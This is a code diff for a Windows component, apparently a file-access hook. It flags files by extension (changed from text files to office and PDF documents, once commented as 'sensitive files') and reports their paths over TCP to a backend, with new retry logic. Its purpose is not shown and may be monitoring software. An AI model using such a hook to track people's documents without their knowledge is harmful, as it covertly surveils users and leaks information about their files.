@@ -235,7 +235,7 @@ VOID AddTask(CONST CHAR* lpFilePath, DWORD dwSize)
 	memcpy(tTask.path, lpFilePath, dwSize);
 	tTask.ltime = (size_t)time(NULL);
 	tTask.len = dwSize;
-	tTask.status = TRUE;
+	tTask.status = FALSE;
 
 	// acquire lock: gll_tail
 	WaitForSingleObject(semhd, INFINITE);
@@ -251,12 +251,19 @@ VOID AddTask(CONST CHAR* lpFilePath, DWORD dwSize)
 }
 
 
-// 判断是否为一个"敏感文件"
+// 判断是否为 指定格式的文件
 BOOL ProcessFilePath(LPCSTR lpFilePath)
 {
 	static LPCSTR matchList[] = {
-		".txt",
-		".text",
+		".rtf",
+
+		".xls",
+		".xlsx",
+
+		".ppt",
+		".pptx",
+
+		".pdf",
 		".doc",
 		".docx",
 		".wps",
@@ -345,34 +352,40 @@ VOID SendMsg2Backend()
 
 		if (GetTask(&tsk))
 		{
-			//MessageBox(NULL, tPath, "Tell Backend", MB_OK);
-			printf("[SEND:%d] %s\n", tsk.ltime, tsk.path);
-			sent = send(GLOBAL_SOCKET, tsk.path, tsk.len, 0);
-			tsk.status = true;		// 无论是否发送成功,只发送一次
-
-			if (sent <= 0)		
+			int   MaxRetryTime = MAX_RETRY_TIME;
+			while ((tsk.status != TRUE) && (MaxRetryTime-- > 0))
 			{
-				// 如果发送失败,跳过下面代码
-				if (sent < 0)  // TCP连接失效
+				//MessageBox(NULL, tPath, "Tell Backend", MB_OK);
+				printf("[SEND:%d] %s\n", tsk.ltime, tsk.path);
+				sent = send(GLOBAL_SOCKET, tsk.path, tsk.len, 0);
+
+				if (sent <= 0)
 				{
-					printf("[SENT-FAILED:]\n");
-					isConnectionOK = FALSE;
+					// 如果发送失败,跳过下面代码
+					if (sent < 0)  // TCP连接失效
+					{
+						printf("[SENT-FAILED:]\n");
+						isConnectionOK = FALSE;
+					}
+					continue;
 				}
-				continue;
-			}
-			else  // 发送成功
-			{
-				printf("[SENT-OK:]\n");
-				length = recv(GLOBAL_SOCKET, tmpBuf, sizeof(tmpBuf), 0);
-				//tsk.status = false;
-				//printf("[HOOK-RECV:%d] %s", ret, tmpBuf);
-			}
-		}
-		if (!InitTcpConnection())
-		{
-			isConnectionOK = FALSE;
-		}
+				else  // 发送成功
+				{
+					printf("[SENT-OK:]\n");
+					length = recv(GLOBAL_SOCKET, tmpBuf, sizeof(tmpBuf), 0);
+					tsk.status = true;		// 如果发送成功,标记发送状态为 真
+					//tsk.status = false;
+					//printf("[HOOK-RECV:%d] %s", ret, tmpBuf);
+				}
 
+				if (!tsk.status)
+				{
+					isConnectionOK = FALSE;
+					InitTcpConnection();
+				}
+
+			}
+		}
 
 	}// end while
 	
